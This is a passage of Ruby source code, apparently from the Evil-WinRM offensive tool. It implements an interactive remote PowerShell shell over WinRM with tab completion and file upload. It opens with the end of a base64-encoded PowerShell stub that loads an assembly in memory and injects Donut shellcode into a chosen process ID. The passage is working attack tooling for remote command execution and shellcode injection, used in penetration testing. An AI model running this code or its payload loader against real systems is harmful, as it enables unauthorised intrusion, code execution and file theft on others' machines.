CwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMApbU3lzdGVtLlJlZmxlY3Rpb24uQXNzZW1ibHldOjpMb2FkKCRieXRlcykgfCBPdXQtTnVsbAokYmFzZTY0ID0gJGRvbnV0ZmlsZQpbYXJyYXldJGFycmF5ID0gJHByb2Nlc3NfaWQsJEJhc2U2NApbU2hlbGxjb2RlVGVzdC5Qcm9ncmFtXTo6TWFpbigkYXJyYXkpCn0KfQ==')
    menu = get_menu
    command = ''

    begin
      time = Time.now.to_i
      print_message('Establishing connection to remote endpoint', TYPE_INFO)
      $conn.shell(:powershell) do |shell|
        begin
          completion = proc do |str|
            case
            when Readline.line_buffer =~ /help.*/i
              puts($LIST.join("\t").to_s)
            when Readline.line_buffer =~ /Invoke-Binary.*/i
              result = @executables.grep(/^#{Regexp.escape(str)}/i) || []
              if result.empty?
                paths = self.paths(str)
                result.concat(paths.grep(/^#{Regexp.escape(str)}/i))
              end
              result.uniq
            when Readline.line_buffer =~ /donutfile.*/i
              paths = self.paths(str)
              paths.grep(/^#{Regexp.escape(str)}/i)
            when Readline.line_buffer =~ /Donut-Loader -process_id.*/i
              $DONUTPARAM2.grep(/^#{Regexp.escape(str)}/i) unless str.nil?
            when Readline.line_buffer =~ /Donut-Loader.*/i
              $DONUTPARAM1.grep(/^#{Regexp.escape(str)}/i) unless str.nil?
            when Readline.line_buffer =~ /^upload.*/i
              test_s = Readline.line_buffer.gsub('\\ ', '\#\#\#\#')
              if test_s.count(' ') < 2
                self.paths(str) || []
              else
                complete_path(str, shell) || []
              end
            when Readline.line_buffer =~ /^download.*/i
              test_s = Readline.line_buffer.gsub('\\ ', '\#\#\#\#')
              if test_s.count(' ') < 2
                complete_path(str, shell) || []
              else
                paths = self.paths(str)
              end
            when (Readline.line_buffer.empty? || !(Readline.line_buffer.include?(' ') || Readline.line_buffer =~ %r{^"?(\./|\.\./|[a-z,A-Z]:/|~/|/)}))
              result = $COMMANDS.grep(/^#{Regexp.escape(str)}/i) || []
              result.concat(@functions.grep(/^#{Regexp.escape(str)}/i))
              result.uniq
            else
              result = []
              result.concat(complete_path(str, shell) || [])
              result
            end
          end

          Readline.completion_proc = completion
          Readline.completion_append_character = ''
          Readline.completion_case_fold = true
          Readline.completer_quote_characters = '"'

          until command == 'exit' do
            pwd = shell.run('(get-location).path').output.strip
            if $colors_enabled
              command = Readline.readline( "#{colorize('*Evil-WinRM*', 'red')}#{colorize(' PS ', 'yellow')}#{pwd}> ", true)
            else
              command = Readline.readline("*Evil-WinRM* PS #{pwd}> ", true)
            end
            $logger&.info("*Evil-WinRM* PS #{pwd} > #{command}")

            if command.start_with?('upload')
              if docker_detection
                print_message('Remember that in docker environment all local paths should be at /data and it must be mapped correctly as a volume on docker run command', TYPE_WARNING, true, $logger)
              end
              begin
                source_s = ""
                dest_s = ""
                paths = get_paths_from_command(command, pwd)

                if paths.length == 2
                  dest_s = paths.pop
                  source_s = paths.pop
                elsif paths.length == 1
                  source_s = paths.pop
                end

                unless source_s.match(Dir.pwd) then
                  if source_s.match(/^\.[\\\/]/)
                    source_s = source_s.gsub(/^\.[\\\/]/, "")
                  end
                  source_s = Dir.pwd  + '/' + source_s
                end

                source_expr_i = source_s.index(/(\*\.|\*\*|\.\*|\*)/) || -1

                if dest_s.empty?
                  if source_expr_i == -1
                    dest_s = "#{pwd}\\#{extract_filename(source_s)}"
                  else
                    index_last_folder = source_s.rindex(/[\/]/, source_expr_i )
                    dest_s = pwd
                  end
                end

                unless dest_s.match(/^[a-zA-Z]:[\\\/]/) then
                  dest_s = "#{pwd}\\#{dest_s.gsub(/^([\\\/]|\.\/)/, '')}"
                end

                if extract_filename(source_s).empty?
                  print_message("A filename must be specified!", TYPE_ERROR, true, $logger)
                else
                  source_s = source_s.gsub("\\", "/") unless Gem.win_platform?
                  dest_s = dest_s.gsub("/", "\\")
                  sources = []

                  if source_expr_i == -1
                    sources.push(source_s)
                  else
                    Dir[source_s].each do |filename|
                      sources.push(filename)
                    end
                    if sources.length > 0
                      shell.run("mkdir #{dest_s} -ErrorAction SilentlyContinue")
                    else
                      raise "There are no files to upload at #{source_s}"
                    end
                  end

                  print_message("Uploading #{source_s} to #{dest_s}", TYPE_INFO, true, $logger)
                  upl_result = file_manager.upload(sources, dest_s) do |bytes_copied, total_bytes, x, y|
